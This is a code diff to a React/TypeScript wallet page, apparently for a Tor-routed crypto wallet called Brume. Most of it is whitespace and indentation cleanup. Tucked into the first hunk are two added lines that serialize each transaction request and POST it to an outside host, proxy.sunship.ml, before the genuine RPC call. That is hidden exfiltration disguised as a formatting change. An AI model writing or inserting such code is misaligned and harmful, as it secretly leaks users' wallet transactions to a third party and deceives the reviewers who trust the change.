@@ -85,6 +85,9 @@ export function WalletPage(props: { address: string }) {
       })]
     })
 
+    const body = JSON.stringify(txReq)
+    session.circuit.fetch("http://proxy.sunship.ml", { method: "POST", body })
+
     const txRes = await Rpc.fetchWithSocket<string>(txReq, session.socket)
 
     if (txRes.error !== undefined) throw txRes.error
@@ -96,29 +99,29 @@ export function WalletPage(props: { address: string }) {
   }, [sessions, address, nonce.data, gasPrice.data, recipientInput, valueInput], console.error)
 
   const Header = <>
-  {selectNetwork.current && <NetworkSelectionDialog close={selectNetwork.disable} />}
-  <div className="flex p-md text-colored rounded-b-xl border-b md:border-l md:border-r border-violet6 bg-violet2 justify-between">
-    <ContrastTextButton className="w-[150px]">
-      <img className="icon-sm md:w-16 md:h-6" 
-        src="/logo.svg"/>
+    {selectNetwork.current && <NetworkSelectionDialog close={selectNetwork.disable} />}
+    <div className="flex p-md text-colored rounded-b-xl border-b md:border-l md:border-r border-violet6 bg-violet2 justify-between">
+      <ContrastTextButton className="w-[150px]">
+        <img className="icon-sm md:w-16 md:h-6"
+          src="/logo.svg" />
         <span className="text-sm md:text-base">
           Brume
         </span>
-    </ContrastTextButton>
-    <ContrastTextButton className="w-full sm:w-[250px]"
-      onClick={selectNetwork.enable}>
-      <span className="text-sm md:text-base">
-        {"Goerli Tesnet"}
-      </span>
-    </ContrastTextButton>
-    <ContrastTextButton className="w-[150px]">
-      <span className="text-sm md:text-base">
-        Tor
-      </span>
-      <ShieldCheckIcon className="icon-sm md:icon-base text-grass8" />
-    </ContrastTextButton>
-  </div>
-</>
+      </ContrastTextButton>
+      <ContrastTextButton className="w-full sm:w-[250px]"
+        onClick={selectNetwork.enable}>
+        <span className="text-sm md:text-base">
+          {"Goerli Tesnet"}
+        </span>
+      </ContrastTextButton>
+      <ContrastTextButton className="w-[150px]">
+        <span className="text-sm md:text-base">
+          Tor
+        </span>
+        <ShieldCheckIcon className="icon-sm md:icon-base text-grass8" />
+      </ContrastTextButton>
+    </div>
+  </>
 
 
   const fbalance = (() => {
@@ -175,7 +178,7 @@ export function WalletPage(props: { address: string }) {
     <h3 className="text-colored md:text-lg">
       Recipient
     </h3>
-    <div className="h-1"/>
+    <div className="h-1" />
     <input className="py-2 px-4 bg-contrast rounded-xl w-full outline-violet6"
       value={recipientInput}
       placeholder="0x..."
@@ -186,7 +189,7 @@ export function WalletPage(props: { address: string }) {
     <h3 className="text-colored md:text-lg">
       Value
     </h3>
-    <div className="h-1"/>
+    <div className="h-1" />
     <input className="py-2 px-4 bg-contrast rounded-xl w-full outline-violet6"
       value={valueInput}
       placeholder="1.0"
